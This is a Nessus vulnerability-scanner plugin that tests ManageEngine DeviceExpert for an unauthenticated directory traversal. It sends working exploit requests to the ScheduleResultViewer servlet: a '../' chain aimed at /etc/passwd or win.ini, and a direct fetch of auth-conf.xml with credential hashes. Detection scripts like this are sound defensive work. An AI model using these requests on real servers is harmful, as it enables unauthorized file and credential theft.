#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(58428);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2016/10/27 15:03:54 $");

  script_bugtraq_id(52559);
  script_xref(name:"EDB-ID", value:"18626");

  script_name(english:"ManageEngine DeviceExpert ScheduleResultViewer Remote Directory Traversal");
  script_summary(english:"Checks for directory traversal in DeviceExpert");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote host is running a web application that is vulnerable to a
directory traversal attack."
  );
  script_set_attribute(
    attribute:"description",
    value:
"DeviceExpert is susceptible to a directory traversal attack on the
'FileName' parameter of 'ScheduleResultView' servlet
(scheduleresult.de).

It is possible for an unauthenticated, remote attacker to invoke the
ScheduleResultViewer to disclose every file on the system, including
database tables containing usernames and passwords of managed
devices."
  );
  script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/9sg_me_poc.htm");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2012/Mar/86");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/03/19");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/03/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/03/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:manageengine:device_expert");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("os_fingerprint.nasl", "manageengine_deviceexpert_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 6060);
  script_require_keys("www/manageengine_deviceexpert");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

port = get_http_port(default:6060);

install = get_install_from_kb(appname:'manageengine_deviceexpert', port:port, exit_on_fail:TRUE);
dir = install['dir'];

os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('/windows/win.ini', '/winnt/win.ini');
  else files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
# look for section tags in win.ini
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

vuln_script = '/scheduleresult.de';
vuln_param = 'FileName';

traversal = mult_str(str:"../", nb:12) + '..';

foreach file (files)
{
  exploit_url = dir + vuln_script + '/?' + vuln_param + '=' + traversal + file;
  res = http_send_recv3(method:"GET", item:exploit_url, port:port, exit_on_fail:TRUE);
  pat = file_pats[file];
  if (res[2] =~ pat)
  {
    if (report_verbosity > 0)
    {
      report = '\n' + 'Nessus was able to exploit the issue and retrieve the contents of';
      report += '\n' + file + ' with the following request:' + '\n\n';
      report += build_url(qs:exploit_url, port:port) + '\n';
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}

# file that comes with product, used as a backup in case
# files above using directory traversal aren't found/verified
# it contains the usernames and password hashes for the application
file = "conf\Authentication\auth-conf.xml";
exploit_url = dir + vuln_script + '/?' + vuln_param + '=' + file;

res = http_send_recv3(method:"GET", item:exploit_url, port:port, exit_on_fail:TRUE);

if (
  "<auth-conf>" >< res[2] &&
  "<AaaPasswordRuleList>" >< res[2]
)
{
  if (report_verbosity > 0)
  {
    report =  '\nNessus was able to exploit the issue and retrieve the contents of';
    report += '\n"conf\\Authentication\\auth-conf.xml" (containing the usernames and';
    report += '\nhashed passwords for the application) with the following request:\n\n';
    report += build_url(qs:exploit_url, port:port) + '\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else exit(0, 'The ManageEngine DeviceExpert install at ' + build_url(qs:dir, port:port) + ' is not affected.');
